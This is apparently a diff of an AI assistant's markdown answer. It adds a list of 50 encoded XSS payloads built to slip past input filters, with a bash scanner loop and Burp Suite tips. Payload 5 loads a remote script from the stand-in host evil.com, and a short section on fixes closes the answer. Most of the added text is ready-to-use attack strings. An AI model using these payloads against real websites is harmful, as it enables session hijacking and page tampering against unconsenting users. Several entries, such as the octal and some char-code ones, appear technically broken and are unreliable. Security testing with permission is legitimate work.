@@ -397,4 +397,205 @@ Below is a list of 100 critical XSS (Cross-Site Scripting) payloads that can be 
 
 ---
 
-If you meant “payloads to fix” as in tools or code snippets to patch XSS, let me know—I can provide server-side fixes (e.g., PHP escaping) or a more advanced scanner instead! What’s your next step?
+---
+
+### Notes
+- **Purpose**: Encoded payloads help test for XSS where filters block obvious strings like `<script>` or `alert`. They’re stealthier and target edge cases.
+- **Usage**: Inject these into forms, URL parameters, headers, or anywhere user input is reflected. Use only on systems you have permission to test.
+- **Decoding**: Browsers decode these automatically if not sanitized properly, triggering the XSS.
+
+---
+
+### 50 Encoded XSS Payloads
+
+#### URL-Encoded Payloads
+1. `%3Cscript%3Ealert('xss')%3C/script%3E`  
+   - Decodes to: `<script>alert('xss')</script>`
+
+2. `%3Cimg%20src%3Dx%20onerror%3Dalert('xss')%3E`  
+   - Decodes to: `<img src=x onerror=alert('xss')>`
+
+3. `%3Csvg%20onload%3Dalert('xss')%3E`  
+   - Decodes to: `<svg onload=alert('xss')>`
+
+4. `%22%3E%3Cscript%3Ealert('xss')%3C/script%3E`  
+   - Decodes to: `"><script>alert('xss')</script>`
+
+5. `%3Cscript%20src%3D%22http%3A//evil.com/xss.js%22%3E%3C/script%3E`  
+   - Decodes to: `<script src="http://evil.com/xss.js"></script>`
+
+#### Double URL-Encoded Payloads
+6. `%253Cscript%253Ealert('xss')%253C/script%253E`  
+   - Double-decodes to: `<script>alert('xss')</script>`
+
+7. `%253Cimg%2520src%253Dx%2520onerror%253Dalert('xss')%253E`  
+   - Double-decodes to: `<img src=x onerror=alert('xss')>`
+
+8. `%2522%253E%253Cscript%253Ealert('xss')%253C/script%253E`  
+   - Double-decodes to: `"><script>alert('xss')</script>`
+
+9. `%253Csvg%2520onload%253Dalert('xss')%253E`  
+   - Double-decodes to: `<svg onload=alert('xss')>`
+
+10. `%253Ciframe%2520src%253Djavascript%253Aalert('xss')%253E`  
+    - Double-decodes to: `<iframe src=javascript:alert('xss')>`
+
+#### HTML Entity-Encoded Payloads
+11. `&lt;script&gt;alert('xss')&lt;/script&gt;`  
+    - Decodes to: `<script>alert('xss')</script>` (if not re-escaped)
+
+12. `&lt;img src=x onerror=alert('xss')&gt;`  
+    - Decodes to: `<img src=x onerror=alert('xss')>`
+
+13. `&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;`  
+    - Decodes to: `"><script>alert('xss')</script>`
+
+14. `&lt;svg onload=alert('xss')&gt;`  
+    - Decodes to: `<svg onload=alert('xss')>`
+
+15. `&lt;body onload=alert('xss')&gt;`  
+    - Decodes to: `<body onload=alert('xss')>`
+
+#### Hex-Encoded Payloads
+16. `\x3Cscript\x3Ealert('xss')\x3C/script\x3E`  
+    - Decodes to: `<script>alert('xss')</script>`
+
+17. `\x3Cimg\x20src\x3Dx\x20onerror\x3Dalert('xss')\x3E`  
+    - Decodes to: `<img src=x onerror=alert('xss')>`
+
+18. `\x22\x3E\x3Cscript\x3Ealert('xss')\x3C/script\x3E`  
+    - Decodes to: `"><script>alert('xss')</script>`
+
+19. `\x3Csvg\x20onload\x3Dalert('xss')\x3E`  
+    - Decodes to: `<svg onload=alert('xss')>`
+
+20. `\x3Ca\x20href\x3Djavascript\x3Aalert('xss')\x3EClick\x3C/a\x3E`  
+    - Decodes to: `<a href=javascript:alert('xss')>Click</a>`
+
+#### Unicode-Encoded Payloads
+21. `\u003Cscript\u003Ealert('xss')\u003C/script\u003E`  
+    - Decodes to: `<script>alert('xss')</script>`
+
+22. `\u003Cimg\u0020src\u003Dx\u0020onerror\u003Dalert('xss')\u003E`  
+    - Decodes to: `<img src=x onerror=alert('xss')>`
+
+23. `\u0022\u003E\u003Cscript\u003Ealert('xss')\u003C/script\u003E`  
+    - Decodes to: `"><script>alert('xss')</script>`
+
+24. `\u003Csvg\u0020onload\u003Dalert('xss')\u003E`  
+    - Decodes to: `<svg onload=alert('xss')>`
+
+25. `\u003Cinput\u0020autofocus\u0020onfocus\u003Dalert('xss')\u003E`  
+    - Decodes to: `<input autofocus onfocus=alert('xss')>`
+
+#### Base64-Encoded Payloads
+26. `<script>eval(atob('YWxlcnQoJ3hzcycp'))</script>`  
+    - Base64 `YWxlcnQoJ3hzcycp` decodes to: `alert('xss')`
+
+27. `<img src=x onerror=eval(atob('YWxlcnQoJ3hzcycp'))>`  
+    - Same Base64 decoding.
+
+28. `<script>Function(atob('YWxlcnQoJ3hzcycp'))()</script>`  
+    - Executes decoded `alert('xss')`.
+
+29. `<svg onload=eval(atob('YWxlcnQoJ3hzcycp'))>`  
+    - SVG with Base64 trigger.
+
+30. `data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=`  
+    - Base64 HTML: `<script>alert('xss')</script>`
+
+#### Mixed Encoding
+31. `%3Cscr%69pt%3Ealert('xss')%3C/scr%69pt%3E`  
+    - Partial URL-encoding (`i` as `%69`) to: `<script>alert('xss')</script>`
+
+32. `\x3Cscr\u0069pt\x3Ealert('xss')\x3C/scr\u0069pt\x3E`  
+    - Hex + Unicode mix.
+
+33. `&lt;scr%69pt&gt;alert('xss')&lt;/scr%69pt&gt;`  
+    - HTML entity + URL-encoded `i`.
+
+34. `%3Cimg%20src%3Dx%20onerror%3Deval(atob('YWxlcnQoJ3hzcycp'))%3E`  
+    - URL + Base64 combo.
+
+35. `\u003Cscript\u003Eeval(atob('YWxlcnQoJ3hzcycp'))\u003C/script\u003E`  
+    - Unicode + Base64.
+
+#### Char Code Payloads
+36. `<script>eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</script>`  
+    - Char codes for `alert('xss')`.
+
+37. `<img src=x onerror=String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41)>`  
+    - Same in attribute.
+
+38. `<script>[97,108,101,114,116].map(String.fromCharCode).join('')('xss')</script>`  
+    - Array-based char code execution.
+
+39. `<svg onload=String.fromCharCode(97,108,101,114,116)(39,120,115,115,39)>`  
+    - SVG with char codes.
+
+40. `<script>new Function(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))()</script>`  
+    - Function constructor with char codes.
+
+#### Octal-Encoded Payloads
+41. `\074script\076alert('xss')\074/script\076`  
+    - Octal for `<script>alert('xss')</script>`.
+
+42. `\074img\040src\075x\040onerror\075alert('xss')\076`  
+    - Octal for `<img src=x onerror=alert('xss')>`.
+
+43. `\042\076\074script\076alert('xss')\074/script\076`  
+    - Octal for `"><script>alert('xss')</script>`.
+
+44. `\074svg\040onload\075alert('xss')\076`  
+    - Octal for `<svg onload=alert('xss')>`.
+
+45. `\074a\040href\075javascript\072alert('xss')\076Click\074/a\076`  
+    - Octal for `<a href=javascript:alert('xss')>Click</a>`.
+
+#### Data URI Encoded
+46. `<script src="data:text/javascript,alert('xss')"></script>`  
+    - Data URI script.
+
+47. `<img src="data:image/svg+xml,<svg onload=alert('xss')>">`  
+    - SVG in data URI.
+
+48. `<iframe src="data:text/html,<script>alert('xss')</script>"></iframe>`  
+    - HTML in iframe data URI.
+
+49. `<object data="data:text/javascript,alert('xss')">`  
+    - Object with data URI.
+
+50. `<link rel="stylesheet" href="data:text/css,*{xss:expression(alert('xss'))}">`  
+    - CSS data URI (old IE).
+
+---
+
+### How to Use These
+1. **Manual Testing**: Inject into input fields, URL parameters (e.g., `?q=%3Cscript%3E...`), or headers.
+2. **Automation**: Modify `xss_scanner.sh`:
+   ```bash
+   PAYLOADS=("%3Cscript%3Ealert('xss')%3C/script%3E" "\x3Cscript\x3Ealert('xss')\x3C/script\x3E" ...)
+   for payload in "${PAYLOADS[@]}"; do
+       test_url="${url}?q=${payload}"
+       curl -s "$test_url" | grep -q "$(echo "$payload" | sed 's/%[0-9A-F]\{2\}/./g')" && echo -e "${RED}XSS Found: $payload${NC}"
+   done
+   ```
+3. **Burp Suite**: Load into Intruder’s payload list.
+
+---
+
+### Why These Are Advanced
+- **Obfuscation**: Encodings hide malicious intent from simple regex filters (e.g., `/<script>/`).
+- **Bypass**: Targets apps that decode input (e.g., URL decoding in query strings) but don’t sanitize afterward.
+- **Edge Cases**: Tests for mishandling of rare encodings like octal or mixed formats.
+
+---
+
+### Fixing Vulnerabilities These Uncover
+If any payload executes:
+- **Escape Output**: Use `htmlspecialchars()` (PHP), `encodeURIComponent()` (JS), etc., based on context.
+- **CSP**: Add `Content-Security-Policy: script-src 'self';` to block inline scripts.
+- **Input Validation**: Reject unexpected characters (e.g., `%`, `\x`, `&lt;`).
+- **Normalize Input**: Decode all input fully before processing (e.g., `urldecode()` twice).
+
+Let me know if you need more encodings, specific bypasses, or help integrating these into a testing workflow!
